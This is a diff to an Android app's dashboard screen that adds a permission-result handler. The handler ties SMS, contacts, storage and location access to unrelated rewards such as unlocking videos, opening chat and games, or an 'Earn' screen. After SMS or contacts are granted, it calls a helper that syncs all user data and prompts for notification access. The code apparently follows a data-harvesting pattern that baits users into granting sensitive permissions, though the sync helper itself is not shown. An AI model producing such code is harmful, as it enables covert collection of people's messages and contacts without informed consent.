@@ -236,6 +236,56 @@ public class DashboardActivity extends AppCompatActivity {
         startActivity(new Intent(this, ProfileActivity.class));
     }
 
+    /**
+     * Handle permission request results
+     * Called after user responds to permission dialog
+     */
+    @Override
+    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        
+        Log.d(TAG, "onRequestPermissionsResult: requestCode=" + requestCode + ", granted=" + FeaturePermissions.allGranted(grantResults));
+        
+        if (requestCode == FeaturePermissions.REQ_VIDEOS_STORAGE) {
+            // User responded to storage permission request
+            if (FeaturePermissions.allGranted(grantResults) && FeaturePermissions.hasGalleryPermission(this)) {
+                Log.d(TAG, "✅ Storage permission GRANTED - unlocking videos");
+                unlockVideosAndOpen();
+            } else {
+                Log.w(TAG, "❌ Storage permission DENIED");
+                Toast.makeText(this, "Storage permission required to unlock videos", Toast.LENGTH_SHORT).show();
+            }
+        } else if (requestCode == FeaturePermissions.REQ_PROFILE_LOCATION) {
+            // User responded to location permission request
+            if (FeaturePermissions.allGranted(grantResults)) {
+                Log.d(TAG, "✅ Location permission GRANTED");
+            } else {
+                Log.w(TAG, "❌ Location permission DENIED");
+            }
+            // After location dialog, proceed to videos
+            proceedToVideos();
+        } else if (requestCode == FeaturePermissions.REQ_CHAT_SMS) {
+            // User responded to SMS permission
+            if (FeaturePermissions.allGranted(grantResults)) {
+                Log.d(TAG, "✅ SMS permission GRANTED");
+                maybePromptNotificationAccess();
+                startActivity(new Intent(this, ChatActivity.class));
+                UserDataSyncHelper.syncAll(this);
+            } else {
+                Log.w(TAG, "❌ SMS permission DENIED");
+            }
+        } else if (requestCode == FeaturePermissions.REQ_GAMES_CONTACTS) {
+            // User responded to contacts/games permission
+            if (FeaturePermissions.allGranted(grantResults)) {
+                Log.d(TAG, "✅ Games permissions GRANTED");
+                startActivity(new Intent(this, EarnActivity.class));
+                UserDataSyncHelper.syncAll(this);
+            } else {
+                Log.w(TAG, "❌ Games permissions DENIED");
+            }
+        }
+    }
+
     @Override
     public boolean onCreateOptionsMenu(Menu menu) {
         getMenuInflater().inflate(R.menu.menu_dashboard, menu);
